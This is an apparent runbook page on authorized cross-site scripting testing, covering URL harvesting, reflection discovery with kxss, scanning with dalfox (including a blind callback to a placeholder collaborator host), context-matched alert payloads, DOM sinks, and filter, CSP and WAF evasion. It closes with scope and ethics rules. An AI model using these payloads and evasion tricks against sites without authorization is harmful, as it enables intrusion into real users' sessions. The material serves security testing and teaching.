---
title: "Cross-Site Scripting (XSS)"
description: "Reflected, stored and DOM-based XSS: finding sinks, escaping context, CSP bypass, and proving impact with a minimal, non-destructive payload."
phase: Web
order: 1
tags:
  - xss
  - client-side
  - injection
  - owasp
tools:
  - dalfox
  - xsstrike
  - kxss
  - burp suite
updated: 2026-10-01
---

A runbook for authorized XSS testing on **in-scope** targets. Goal: find where input reaches a browser sink, land a minimal payload in the correct context, and show impact without harming real users.

## 1. Harvest parameterized URLs

Seed the scan with every URL that carries input.

```bash
# Passive URLs from archives and crawlers
gau target.com | grep '=' | sort -u > urls.txt
katana -u https://target.com -d 3 -silent | grep '=' | tee -a urls.txt
sort -u urls.txt -o urls.txt
```

## 2. Find reflection points

Send a unique marker to every parameter and grep the response for it.

```bash
cat urls.txt | kxss | tee kxss.txt
# or feed a raw parameter list
echo "q" | kxss-url
```

`kxss` reports unencoded characters (`<`, `>`, `"`, `'`) next to your marker — these are the promising reflected inputs.

## 3. Confirm with an automated scanner

Point the scanner at the confirmed candidates; keep the payload set small and non-destructive.

```bash
dalfox file urls.txt --mining-dom --blind https://your-collab.net/x \
  --output dalfox.txt --only-poc r

xsstrike -u "https://target/search?q=test" --crawl
```

## 4. Match the context

The payload only fires if it matches the surrounding syntax. Inspect the response and pick the closing sequence.

```html
<!-- HTML body -->
<script>alert(document.domain)</script>

<!-- Attribute (break out first) -->
" onmouseover="alert(document.domain)

<!-- JS string -->
';alert(document.domain)//

<!-- URL context -->
javascript:alert(document.domain)
```

## 5. DOM-based sinks

Trace untrusted sources into dangerous sinks in the JS:

- Sources: `location`, `location.hash`, `document.referrer`, `postMessage`, `localStorage`.
- Sinks: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout(string)`, `dangerouslySetInnerHTML`.

Reproduce by setting the source directly (e.g. `#<img src=x onerror=alert(1)>`) and watch the DOM in DevTools.

## 6. Evasion and CSP

- Filters: mixed case (`<ScRiPt>`), HTML entities, `<svg onload=`, `<img onerror=`.
- CSP: check for `unsafe-inline`, missing `base-uri`, allowed CDNs hosting user scripts, or JSONP callbacks.
- WAF: fragment tags, unusual whitespace, alternate encodings.

## 7. Prove impact responsibly

Use `alert(document.domain)` or a callback to a host you control — never a live session stealer. For stored XSS, demonstrate on **your own** record only.

## Full pipeline

```bash
# Harvest URLs
gau target.com | grep '=' | sort -u > urls.txt
katana -u https://target.com -d 3 -silent | grep '=' | sort -u | tee -a urls.txt

# Find reflections (unencoded chars next to your marker)
cat urls.txt | kxss | tee kxss.txt

# Scan candidates with a blind callback for out-of-band proof
dalfox file urls.txt --mining-dom --blind https://your-collab.net/x \
  --output dalfox.txt --only-poc r

# Then manually match context and reduce to the smallest working payload
```

## Ethics & legality

- Only test targets in an official scope or with written authorization.
- Never use session-stealing or worm payloads against real users; use your own account for stored XSS.
- Keep payloads minimal and document the exact request, context, and response as evidence.
